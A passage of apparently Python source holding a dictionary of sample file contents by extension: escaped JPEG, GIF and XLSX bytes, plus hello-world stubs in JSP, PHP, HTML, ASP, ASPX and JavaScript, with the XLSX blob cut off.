\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7f\xff\xda\x00\x08\x01\x02\x00\x01\x05\x00\x0e\xbf\xff\xda\x00\x08\x01\x03\x00\x01\x05\x00\x0e\xbf\xff\xda\x00\x08\x01\x01\x00\x01\x05\x00\x0e\xbf\xff\xda\x00\x08\x01\x02\x02\x06?\x00\x0e\xbf\xff\xda\x00\x08\x01\x03\x02\x06?\x00\x0e\xbf\xff\xda\x00\x08\x01\x01\x01\x06?\x00\x0e\xbf\xff\xd9',
    'gif':'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;',
    'jsp':'''<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
        pageEncoding="ISO-8859-1"%>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <title>JSP - Hello</title>
    </head>
    <body>
    <%= "Hello" %>
    </body>
    </html>''',
    'php':'<?php echo "hello"; ?>',
    'html':'''<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <title>HTML - Hello</title>
    </head>
    <body>
    Hello
    </body>
    </html>''',
    'asp':'''
    <%
        Hello.Text = "Hello";
    %>
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml" >
    <head runat="server">
        <title>ASP - Hello</title>
    </head>
    <body>
        <form id="form1" runat="server">
        <div>
        <asp:Label runat="server" id="Hello"></asp:Label>
        </div>
        </form>
    </body>
    </html>''',
    'aspx':'''
    <html xmlns="www.w3.org/1999/xhtml">
    <head runat="server">
        <title>ASPX - Hello</title>
    </head>
    <body>
        <form id="form1" runat="server">
        <div>

        <%Response.Write( "HeIIo"); %>

        </div>
        </form>
    </body>
    </html>''',
    'js':'''alert( 'Hello' );''',
    'txt':'hello',
    'csv':'',
    'docx':'',
    'xlsx':'PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00b\xee\x9dh^\x01\x00\x00\x90\x04\x00\x00\x13\x00\x08\x02[Content_Types].xml \xa2\x04\x02(\xa0\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x94\xcbN\xc30\x10E\xf7H\xfcC\xe4-J\xdc\xb2@\x085\xed\x82\xc7\x12*Q>\xc0\xc4\x93\xc6\xaac[\x9eii\xff\x9e\x89\xfb\x10B\xa1\x15j7\xb1\x12\xcf\xdc{2\xf1\xcdh\xb2nm\xb6\x82\x88\xc6\xbbR\x0c\x8b\x81\xc8\xc0U^\x1b7/\xc5\xc7\xec%\xbf\x17\x19\x92rZY\xef\xa0\x14\x1b@1\x19__\x8df\x9b\x00\x98q\xb7\xc3R4D\xe1AJ\xac\x1ah\x15\x16>\x80\xe3\x9d\xda\xc7V\x11\xdf\xc6\xb9\x0c\xaaZ\xa89\xc8\xdb\xc1\xe0NV\xde\x118\xca\xa9\xd3\x10\xe3\xd1\x13\xd4ji){^\xf3\xe3-I\x04\x8b"{\xdc\x16v^\xa5P!XS)bR\xb9r\xfa\x97K\xbes(\xb83\xd5`c\x02\xde0\x86\x90\xbd\x0e\xdd\xce\xdf\x06\xbb\xbe7\x1eM4\x1a\xb2\xa9\x8a\xf4\xaaZ\xc6\x90k+\xbf|\\|z\xbf(\x8e\x8b\xf4P\xfa\xba6\x15h_-[\x9e@\x81!\x82\xd2\xd8\x00Pk\x8b\xb4\x16\xad2n\xcf}\xc4?\x15\xa3L\xcb\xf0\xc2 \xdd\xfb%\xe1\x13\x1c\xc4\xdf\x1bd\xba\x9e\x8f\x90dN\x18"m,\xe0\xa5\xc7\x9eDO97*\x82~\xa7\xc8\xc9\xb88\xc0O\xedc\x1c|n\xa6\xd1\x07\xe4\x04E\xf8\xff\x14\xf6\x11\xe9\xba\xf3\xc0B\x10\xc9\xc0!$}\x87\xed\xe0\xc8\xe9;{\xec\xd0\xe5[\x83\xee\xf1\x96\xe9\x7f2\xfe\x06\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xb5U0#\xf4\x00\x00\x00L\x02\x00\x00\x0b\x00\x08\x02_rels/.rels \xa2\x04\x02(\xa0\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x92MO\xc30\x0c\x86\xefH\xfc\x87\xc8\xf7\xd5\xdd\x90\x10BKwAH\xbb!T~\x80I\xdc\x0f\xb5\x8d\xa3$\x1b\xdd\xbf\'\x1c\x10T\x1a\x83\x03G\x7f\xbd~\xfc\xca\xdb\xdd<\x8d\xea\xc8!\xf6\xe24\xac\x8b\x12\x14;#\xb6w\xad\x86\x97\xfaqu\x07*&r\x96Fq\xac\xe1\xc4\x11v\xd5\xf5\xd5\xf6\x99GJy(v\xbd\x8f*\xab\xb8\xa8\xa1K\xc9\xdf#F\xd3\xf1D\xb1\x10\xcf.W\x1a\t\x13\xa5\x1c\x86\x16=\x99\x81Z\xc6MY\xdeb\xf8\xae\x01\xd5BS\xed\xad\x86\xb0\xb77\xa0\xea\x93\xcf\x9b\x7f\xd7\x96\xa6\xe9\r?\x889L\xec\xd2\x99\x15\xc8sbg\xd9\xae|\xc8l!\xf5\xf9\x1aUSh9i\xb0b\x9er:"y_dl\xc0\xf3D\x9b\xbf\x13\xfd|-N\x9c\xc8R"4\x12\xf82\xcfG\xc7%\xa0\xf5\x7fZ\xb44\xf1\xcb\x9dy\xc47\t\xc3\xab\xc8\xf0\xc9\x82\x8b\x1f\xa8\xde\x01\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00Kc\xe8\xfb\x9f\x02\x00\x00\x16\x06\x00\x00\x0f\x00\x00\x00xl/workbook.xml\xa4T\xdbn\xa30\x10}_i\xff\xc1\xf2;\x05SB\x12\x14R5\x97j#\xed\xb6\xd5n//\x91*\x07\x9c`\xd5\xd8\xacm\x9aTU\xff}\x07\x08I\xd3\xbct[\x046f\xcc\xf1\x99\x99338\xdb\xe4\x02=1m\xb8\x921&\'\x1eFL&*\xe5r\x15\xe3\xdb\x9b\x0b\xa7\x87\x91\xb1T\xa6T(\xc9b\xfc\xcc\x0c>\x1b~\xff6X+\xfd\xb8P\xea\x11\x01\x8041\xce\xac-"\xd75I\xc6rjNT\xc1$X\x96J\xe7\xd4\xc2R\xaf\\ShFS\x931fs\xe1\xfa\x9e\x17\xba9\xe5\x127\x08\x91\xfe\x08\x86Z.y\xc2&*)s&m\x03\xa2\x99\xa0\x16\xe8\x9b\x8c\x17\xa6E\xcb\x93\x8f\xc0\xe5T?\x96\x85\x93\xa8\xbc\x00\x88\x05\x17\xdc>\xd7\xa0\x18\xe5I4[I\xa5\xe9B\x80\xdb\x1b\xd2A\x1b\rw\x08\x0f\xf1`\xf0\xdb\x93\xc0ttT\xce\x13\xad\x8cZ\xda\x13\x80v\x1b\xd2G\xfe\x13\xcf%\xe4 \x04\x9b\xe3\x18|\x0c)p5{\xe2U\x0ew\xact\xf8IV\xe1\x0e+\xdc\x83\x11\xef\xcbh\x04\xa4Uk%\x82\xe0}\x12\xad\xb3\xe3\xe6\xe3\xe1`\xc9\x05\xbbk\xa4\x8bhQ\\\xd2\xbc\xca\x94\xc0HPc\xa7)\xb7,\x8dq\x17\x96j\xcd\xf6\x1f\x02\x8ctY\x8cJ.\xc0\xea\x87\xa1\x1fbw\xb8\x93\xf3\xb5F)[\xd2R\xd8\x1b\x10r\x0b\x0f\x95\xe1\x07~\xb3\x13\x84q.,\xd3\x92Z6V\xd2\x82\x0e\xb7~}Us\xc3\x01`\x8f3\x05\nG\xbf\xd9\xdf\x92k\x06\x85\x05\xfa\x02_a\xa4ID\x17\xe6\x9a\xda\x0c\x95Z\xc4x\x1c\xcdo\r\xb8?\xff9\xbd\xbc\xba\xbb\x9aO\xd4Z\n\x05\x156\x7f#Mz\\\x07\xff!N\x9aT\xb1qw\xb4\x9a\xf7\xf7\xee\x03;\x1d\xb5\x02\xbc\xb6\x1a\xc1\xfbl\xf2\x13\x92\xf0\x87>AJ \xf1\xe9\xb6bg\x10sr\xfa \x13\x1d\x91\x87\x97\x0bB\xa6d<\xea:\xde\xe8\xfc\xd4\t\xbaSh7#/t\xc2~\xd8\x1d\x8f;\xa4\xd7\x9b\xf4_\xc1\x19\x1dF\x89\xa2\xa5\xcd\xb6\xd9\xae\xa0c\x1c@j\x8fL\xbf\xe8\xa6\xb5\x10/*y\xba\xa7\xf1\xe2m/\xa7\x9a\xdf\r\xad\xed\xb5r\xb8\xeakw\x9c\xad\xcd^\x17\xd5\x12m\xee\xb9L\xd5\x1ad\xd3\t@F\xcf\x87\xcbum\xbc\xe7\xa9\xcd\xc0\xc9\xae\xdf\x03\xbf\x9bo?\x18_e\xc0\xb8\xef\xf9\xf0\x1b\xc8\xbf"\x16\xe3\x03B\x93\x86\xd0\x05\\N5\x1c\x10r\xdf0\xaa\x1b(0\xabg$k\xd1\xdfT]\n\x11h\xd5Uw\xad\x83\x0c*\x8f\xaaC\xf4,%u\x12\xdb\xff\x12*\x12Py5\xd5\x1b\xfd\xa0C\xfa\xf5\x8e\xb6\xa5\x0f\xff\x01\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x81>\x94\x97\xf3\x00\x00\x00\xba\x02\x00\x00\x1a\x00\x08\x01xl/_rels/workbook.xml.rels \xa2\x04\x01(\xa0\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xacRMK\xc40\x10\xbd\x0b\xfe\x870w\x9bv\x15\x11\xd9t/"\xecU\xeb\x0f\x08\xc9\xb4)\xdb&!3~\xf4\xdf\x1b*\xba]X\xd6K/\x03o\x86y\xef\xcd\xc7v\xf75\x0e\xe2\x03\x13\xf5\xc1+\xa8\x8a\x12\x04z\x13l\xef;\x05o\xcd\xf3\xcd\x03\x08b\xed\xad\x1e\x82G\x05\x13\x12\xec\xea\xeb\xab\xed\x0b\x0e\x9as\x13\xb9>\x92\xc8,\x9e\x148\xe6\xf8(%\x19\x87\xa3\xa6"D\xf4\xb9\xd2\x864j\xce0u2js\xd0\x1d\xcaMY\xde\xcb\xb4\xe4\x80\xfa\x84S\xec\xad\x82\xb4\xb7\xb7 \x9a)f\xe5\xff\xb9C\xdb\xf6\x06\x9f\x82y\x1f\xd1\xf3\x19\tI<\ry\x00\xd1\xe8\xd4!+\xf8\xc1E\xf6\x08\xf2\xbc\xfcfMy\xcek\xc1\xa3\xfa\x0c\xe5\x1c\xabK\x1e\xaa5=|\x86t \x87\xc8G\x1f\x7f)\x92s\xe5\xa2\x99\xbbU\xef\xe1tB\xfb\xca)\xbf\xdb\xf2,\xcb\xf4\xeff\xe4\xc9\xc7\xd5\xdf\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xbf{\x9d3\x18\x02\x00\x00\x07\x04\x00\x00\x18\x00\x00\x00xl/worksheets/sheet1.xml\x9c\x93K\x8f\x9b0\x10\xc7\xef\x95\xfa\x1d,\xdf\x83\x81<\x96E!\xabvW\xab\xee\xad\xea\xf6q6f\x08V\xfc\xa0\xb6\xf3R\xd5\xef\xde1i\xc8J\xb9D\x8b\xc0\x0c3\xf6\xef?c\x0f\xcb\x87\x83Vd\x07\xceKk*\x9a%)%`\x84m\xa4YW\xf4\xc7\xf7\xe7IA\x89\x0f\xdc4\\Y\x03\x15=\x82\xa7\x0f\xab\x8f\x1f\x96{\xeb6\xbe\x03\x08\x04\t\xc6W\xb4\x0b\xa1/\x19\xf3\xa2\x03\xcd}b{0\x18i\xad\xd3<\xe0\xa7[3\xdf;\xe0\xcd\xb0H+\x96\xa7\xe9\x82i.\r=\x11Jw\x0b\xc3\xb6\xad\x14\xf0d\xc5V\x83\t\'\x88\x03\xc5\x03\xe6\xef;\xd9\xfb3M\x8b[p\x9a\xbb\xcd\xb6\x9f\x08\xab{D\xd4R\xc9p\x1c\xa0\x94hQ\xbe\xac\x8du\xbcVX\xf7!\x9bqA\x0e\x0e\xef\x1c\x9f\xe9Yf\xf0_)i)\x9c\xf5\xb6\r\t\x92\xd9)\xe7\xeb\xf2\xef\xd9=\xe3b$]\xd7\x7f\x13&\x9b1\x07;\x19\x0f\xf0\x82\xca\xdf\x97R6\x1fY\xf9\x056}\'l1\xc2\xe2v\xb9r+\x9b\x8a\xfeI\xff_\x13|gqH/\xc39\xf6\x97\xae\x96\x8d\xc4\x13\x8eU\x11\x07mE?e\x94\xad\x96C\xf3\xfc\x94\xb0\xf7ol\x12x\xfd\n\nD\x00\x14\xc8(\x89\xbdY[\xbb\x89\x13_\xd0\x95"\xce\x0f\x13"\x8e\x8b w\xf0\x08JU\xf4\xf3\x0c\xdb\xfb\xf7 \x80&\n\xb0Q\xe1\xad}V{\x1e\xba\xf9\xab#5\xf7\xf0h\xd5/\xd9\x84\x0e%\xf1\xafi\xa0\xe5[\x15.\xce")\x8a\xc5]V\xdc\xcd\xc7\xe07\xbb\xff\x02r\xdd\x05\\2M\xe2\x0e\xc7\xae*\x9b\xe3\x13x\x81\xed\x8c\x99&\xf9\x1c\xd3\xf8\x07\x00\x00\xff\xff\x00\x00\x00\xff\xff\xb2)\xceHM-qI,I\xd4\xb7\x03\x00\x00\x00\xff\xff\x00\x00\x00\xff\xff\xb2)HLO\xf5M,J\xcf\xcc+V\xc8IM+\xb1U2\xd03WR(\xcaL\xcf\x80\xb1K\xf2\x0b\xc0\xa2\xa6J\nI\xf9%%\xf9\xb90^FjbJj\x11\x88g\xac\xa4\x90\x96\x9f_\x02\xe3\xe8\xdb\xd9\xe8\x97\xe7\x17e\x17g\xa4\xa6\x96\xd8\x01\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xc2\x87\xdb\xf2}\x06\x00\x00\xd7\x1b\x00\x00\x13\x00\x00\x00xl/theme/theme1.xml\xecYKo\x1b7\x10\xbe\x17\xe8\x7f \xf6\x9e\xe8aI\xb6\x8c\xc8\x81%Kq\x9b81l%E\x8e\xd4\x8a\xdae\xc4].H\xca\x8enEr,P\xa0hZ\xf4R\xa0\xb7\x1e\x8a\xb6\x01\x12\xa0\x97\xf4\xd7\xb8M\xd1\xa6@\xfeB\x87\xe4JZZtl\'\x06\xfa\xb2\x0e\xb6\xc4\xfd8\xef\x19\xcep\xaf]\x7f\x980t@\x84\xa4<m\x05\x95\xab\xe5\x00\x914\xe4C\x9aF\xad\xe0n\xbfwe-@R\xe1t\x88\x19OI+\x98\x12\x19\\\xdfx\xff\xbdkx]\xc5$!\x08\xf6\xa7r\x1d\xb7\x82X\xa9l\xbdT\x92!,cy\x95g$\x85g#.\x12\xac\xe0\xa7\x88JC\x81\x0f\x81n\xc2J\xd5r\xb9QJ0M\x03\x94\xe2\x04\xc8\xde\x19\x8dhHP\xdf\x90\x84\xa7\xab\xe8\n\xaa\x96+\xe5`c\xc6\xa8\xcb\x80[\xaa\xa4^\x08\x99\xd8\xd7l\x88\xbb\xfb\xf8\xbe\xe1\xb8\xa2\xd1r*;L\xa0\x03\xccZ\x01\xf0\x1f\xf2\xc3>y\xa8\x02\xc4\xb0T\xf0\xa0\x15\x94\xcd\'(m\\+\xe1\xf5|\x13S\'\xec-\xec\xeb\x99O\xbe/\xdf0\x1cW\rO\x11\r\xe6L+\xbdZsukN\xdf\x00\x98Z\xc6u\xbb\xddN\xb72\xa7g\x008\x0cAk+K\x91f\xad\xb7Vi\xcfh\x16@\xf6\xeb2\xedN\xb9^\xae\xb9\xf8\x02\xfd\x95%\x99\x9b\xedv\xbb\xde\xcce\xb1D\r\xc8~\xad-\xe1\xd7\xca\x8d\xdaf\xd5\xc1\x1b\x90\xc5\xd7\x97\xf0\xb5\xf6f\xa7\xd3p\xf0\x06d\xf1\x8d%|o\xb5\xd9\xa8\xb9x\x03\x8a\x19M\xc7Kh\xed\xd0^/\xa7>\x87\x8c8\xdb\xf6\xc2\xd7\x00\xbeV\xce\xe1\x0b\x14D\xc3<\xd24\x8b\x11O\xd5Y\xe2.\xc1\x0f\xb8\xe8\x01XobX\xd1\x14\xa9iFF8\x84H\xef\xe0d (\xd6\xcc\xf0:\xc1\x85\'v)\x94KK\x9a/\x92\xa1\xa0\x99j\x05\x1ff\x18\xb2fA\xef\xf5\x8b\xef_\xbfx\x86^\xbfxz\xf4\xe8\xf9\xd1\xa3\x9f\x8e\x1e?>z\xf4\xa3\xa5\xe5l\xdc\xc6iT\xdc\xf8\xea\xdb\xcf\xfe\xfc\xfac\xf4\xc7\xb3o^=\xf9\xc2\x8f\x97E\xfc\xaf?|\xf2\xcb\xcf\x9f\xfb\x81\x90M\x0b\x89^~\xf9\xf4\xb7\xe7O_~\xf5\xe9\xef\xdf=\xf1\xc07\x05\x1e\x14\xe1}\x9a\x10\x89n\x93C\xb4\xc7\x13\xd0\xcd\x18\xc6\x95\x9c\x0c\xc4\xf9v\xf4cL\x9d\x1d8\x06\xda\x1e\xd2]\x15;\xc0\xdbS\xcc|\xb86q\x8dwO@!\xf1\x01oL\x1e8\xb2\xee\xc7b\xa2\xa8\x87\xf3\xcd8q\x80;\x9c\xb36\x17^\x03\xdc\xd4\xbc\n\x16\xeeO\xd2\xc8\xcf\\L\x8a\xb8=\x8c\x0f|\xbc;8u\\\xdb\x9ddPMgA\xe9\xd8\xbe\x13\x13G\xcc]\x86S\x85#\x92\x12\x85\xf43>&\xc4\xa3\xdd}J\x1d\xbb\xee\xd0Pp\xc9G\n\xdd\xa7\xa8\x8d\xa9\xd7$}:p\x02i\xb1i\x9b&\xe0\x97\xa9Ogp\xb5c\x9b\x9d{\xa8\xcd\x99O\xeb-r\xe0"!!0\xf3\x08\xdf\'\xcc1\xe3\r<Q8\xf1\x91\xec\xe3\x84\x15\r~\x0b\xab\xd8\'\xe4\xfeT\x84E\\W*\xf0tD\x18G\xdd!\x91\xd2\xb7\xe7\x8e\x00}\x0bN\xbf\x89\xa1vy\xdd\xbe\xc3\xa6\x89\x8b\x14\x8a\x8e}4oa\xce\x8b\xc8->\xee\xc48\xc9\xbc2\xd34.b?\x90c\x08Q\x8cv\xb9\xf2\xc1w\xb8\x9b!\xfa7\xf8\x01\xa7\'\xba\xfb\x1e%\x8e\xbbO/\x04wi\xe4\x88\xb4\x08\x10\xfdd"<\xbe\xbcA\xb8\x9b\x8fS6\xc2\xc4T\x19(\xefN\xa5Nh\xfa\xa6\xb2\xcd(\xd4\xed\xcb\xb2=;\xc76\xe1\x10\xf3%\xcf\xf6\xb1b}\x12\xee_X\xa2\xb7\xf0$\xdd%\x90\x15\xcbG\xd4e\x85\xbe\xac\xd0\xc1\x7f\xbeB\x9f\x94\xcb\x17_\x97\x17\xa5\x18\xaa\xf4\xa2\xef6]xr\xa6&|D\x19\xdbWSFnI\xd3\x87K8\x8c\x86=X4\xc3\x82\x99\x1e\xe7\x03Z\x16\xc3\xd7\xbc\xfdwp\x91\xc0f\x0f\x12\\}DU\xbc\x1f\xe3\x0cz\xf8\x8a\x19K#\x99\x93\x8e$\xca\xb8\x849\xd2,\x9b\x01\x98\x1c\xa3m\xc6X\nm\xbc\x99B\xebz>\xb1UDb\xb5\xc3\x87vy\xa58\x87\xce\xc9\x98\xa942s\xef\x8c\xd1\x8a&pVf+\xab\xef\xc6\xacb\xa5:\xd1l\xaej\x15#\x9a)\x90\x8ejs\x95\xc1\x9f\xcb\xaa\xc1\xe2\xdc\x9a\xd0\xe5 \xe8\x8d\xc0\xca\r\x18\xe8\xb5\xec0\xfb`F\x86\xda\xeevF\x9f\xb9E\xb3\xbeP\x17\xc9\x18\x0fI\xee#\xad\xf7\xb2\x8f*\xc6I\xb3X\x99\x85\x91\xc7Gz\xa6<\xc5G\x05nMM\xf6\x1d\xb8\x9d\xc5IEv\xb5\x13\xd8\xcd\xbc\xf7.^\x9a\r\xd2\x0b/\xe9\x1c>\x96\x8e,-&\'K\xd1a+h\xd6\xab\xf5\x00\x858k\x05#\x18\x9b\xe1k\x92\x81\xd7\xa5n,1\x8b\xe0~*T\xc2\x86\xfd\xa9\xc9l\xc2u\xe1\xcd\xa6?,+p+b\xed\xbe\xa4\xb0S\x072!\xd5\x16\x96\xb1\r\r\xf3(\x0f\x01\x96\x9a!\xdf\xc8_\xad\x83Y/J\x01\x1b\xe9o!\xc5\xca\x1a\x04\xc3\xdf&\x05\xd8\xd1u-\x19\x8dH\xa8\x8a\xce.\xac\x98;\x10\x03\xc8K)\x9f("\xf6\xe3\xe1!\x1a\xb0\x89\xd8\xc3\xe0~\x1d\xaa\xa0\xcf\x90J\xb8\xfd0\x15A\xff\x80k;mm\xf3\xc8-\xcey\xd2\x15/\xcb\x0c\xce\xaec\x96\xc58/\xb7:Eg\x99l\xe1&\x8f\xe72\x98_VZ#\x1e\xe8\xe6\x95\xdd(w~UL\xca_\x90*\xc50\xfe\x9f\xa9\xa2\xcf\x13\xb8\x8eX\x19j\x0f\x84p\x9b,0\xd2\xf9\xda\n\xb8P1\x87*\x94\xc54\xec\t\xb8D3\xb5\x03\xa2\x05\xae~\xe11\x04\x15\xdci\x9b\xff\x82\x1c\xe8\xff6\xe7,\r\x93\xd60U\xaa=\x1a!A\xe1<R\xb1 